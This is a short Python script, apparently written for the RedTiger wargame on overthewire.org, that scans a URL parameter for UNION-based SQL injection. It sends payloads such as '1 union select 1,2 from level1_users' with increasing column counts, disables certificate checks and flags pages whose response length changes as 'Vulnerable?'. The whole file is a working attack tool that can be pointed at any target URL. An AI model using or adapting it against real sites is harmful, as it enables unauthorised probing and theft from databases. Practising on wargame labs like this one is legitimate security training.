#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'nighter@nighter.se'

import requests
import sys
import os
from requests.utils import requote_uri

# Settings
RANGE=5

def exploit(target):
    
    global RANGE
    
    n = ','.join(map(str,range(1,int(RANGE))))
    
    level = ''
    letter = 0
    for i in n.split(','):
        level += str(i) + "," 
        l = level[: -1]
        
        # Modify this QUERY for different UNION SQLi
        payload = '1 union select %s from level1_users' % str(l)
                
        url = requote_uri("%s=%s" % (target, payload))
        
        r = requests.get(url, verify=False)
        
        print("QUERY=%s\n" % url)

        if str(i) == '1':
            letter = len(r.content.decode('utf-8'))
        else:
                        
            if int(len(r.content.decode('utf-8'))) != int(letter):
                print("%s%s%s" % ('\033[91m', "✖ ", "Vulnerable?\033[0m"))
                print("")
                
        print(len(r.content.decode('utf-8')))
        print(r.content.decode('utf-8'))
        
        print("-" * 100)            
    
    
def main(target):
    
    exploit(target)
    
if __name__ == '__main__':
    
    if len(sys.argv) != 2:
        print("** Scan for UNION injection ** \n")
        print("Usage: %s <target>" % sys.argv[0])
        print("%s https://redtiger.labs.overthewire.org/level1.php?cat\n" % sys.argv[0])
        sys.exit(0)
    
    target = sys.argv[1]
    
    main(target)